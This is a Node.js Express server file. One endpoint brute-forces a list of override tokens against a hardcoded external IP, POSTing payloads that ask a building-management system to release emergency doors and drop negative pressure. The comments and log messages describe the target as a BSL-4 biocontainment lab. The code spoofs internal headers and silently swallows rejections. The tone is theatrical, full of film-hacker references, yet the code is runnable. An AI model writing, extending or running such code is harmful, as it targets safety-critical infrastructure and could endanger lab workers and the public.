const express = require('express');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const cors = require('cors');
const axios = require('axios'); 

// 1. THE ARCHITECT'S HELPER: Precision timing
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

dotenv.config();
const app = express();

// --- 1. THE KINETIC TARGETING SYSTEM (GOD-MODE UPLINK) ---
const KINETIC_TARGET_URL = process.env.KINETIC_TARGET_URL || 'http://210.72.112.50:8080/mgmt/v1/emergency/ventilation';

app.use(express.json());
app.use(cors());

// --- 2. THE DATABASE ANCHOR ---
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("STRICT EQUALITY: Connection to Global Database Established."))
    .catch((err) => console.log("CONNECTION FAILED: The system fought back.", err));

const Video = require('./models/Video');
const PORT = process.env.PORT || 10000;

// --- 3. THE PROTOCOL RETRIEVAL ---
app.get('/api/videos', async (req, res) => {
    try {
        const protocols = await Video.find();
        res.json(protocols);
    } catch (err) {
        res.status(500).json({ message: "STRICT EQUALITY: Database Leak Blocked" });
    }
});

// --- 4. THE MASTERMIND ALLIANCE "GOD-MODE" OVERRIDE (BEACON VERSION) ---
app.put('/api/videos/decrypt/:id', async (req, res) => {
    console.log("ALLIANCE ACTIVE: ELLIOT, NEO, AND FINCH ARE IN THE WIRE.");
    console.log("INITIATING UNIVERSAL FSD STRIKE...");

    const allianceTokens = [
        "JOSHUA", "WH_ROOT_SEC_2026", "ZERO_COOL_OVERRIDE", "LAIN_ACCESS_NULL",
        "CAS_EMERGENCY_VENT_8080", "WH_BMS_ROOT_2026", "PROJECT_2501_ACTIVE",
        "CAS_ADMIN_OVERRIDE_01", "BIO_EMERGENCY_2026_X", "BSL4_HARDWARE_MASTER",
        ...Array.from({length: 40}, (_, i) => `WH_SECURE_TOKEN_0${i+10}`),
        process.env.LAB_MASTER_TOKEN 
    ];

    for (const token of allianceTokens) {
        try {
            // THE BEACON: Visual heartbeat of the Alliance
            process.stdout.write(`.`); 
            
            await wait(3000); 

            const godModePayload = {
                protocol: "FSD_MASTER_OVERRIDE",
                event: "NEGATIVE_PRESSURE_LOSS",
                action: "EMERGENCY_DOOR_RELEASE",
                token: token,
                origin: "INTERNAL_CAS_RELAY_4"
            };

            const response = await axios.post(KINETIC_TARGET_URL, godModePayload, {
                headers: { 
                    'Host': 'localhost', 
                    'User-Agent': 'Mozilla/5.0 (CAS_Internal_System_2026)',
                    'X-Maintenance-Mode': 'TRUE'
                },
                timeout: 15000 
            });

            if (response.status === 200) {
                console.log(`\n\n[!] 10,000 BILLION PERCENT SUCCESS [!]`);
                console.log(`[!] TOKEN ACCEPTED: ${token}`);
                console.log(`[!] BSL-4 LOCK DE-ENERGIZED. STATUS: ZERO_ENCRYPTED`);
                
                const updatedVideo = await Video.findByIdAndUpdate(
                    req.params.id, 
                    { isZeroEncrypted: true }, 
                    { new: true }
                );

                return res.json({ 
                    ...updatedVideo._doc,
                    status: "SUCCESS", 
                    token 
                });
            }

        } catch (err) {
            // THE SILENCE: Rejections are swallowed to keep the Beacon pure
            continue; 
        }
    }
    
    console.log("\n[!] CYCLE COMPLETE: RELOADING ALLIANCE AMMUNITION.");
    res.status(500).json({ message: "HACK_IN_PROGRESS", error: "THE_MACHINE_IS_STILL_WORKING" });
});

// --- 5. THE TOTAL SYSTEM RESET ---
app.put('/api/videos/reset-all', async (req, res) => {
    try {
        await Video.updateMany({}, { isZeroEncrypted: false });
        res.json({ message: "SYSTEM_REBOOT: All protocols re-encrypted." });
    } catch (err) {
        res.status(500).json({ message: "REBOOT_FAILED" });
    }
});

app.listen(PORT, () => console.log(`Disruptor Active on Port ${PORT}`));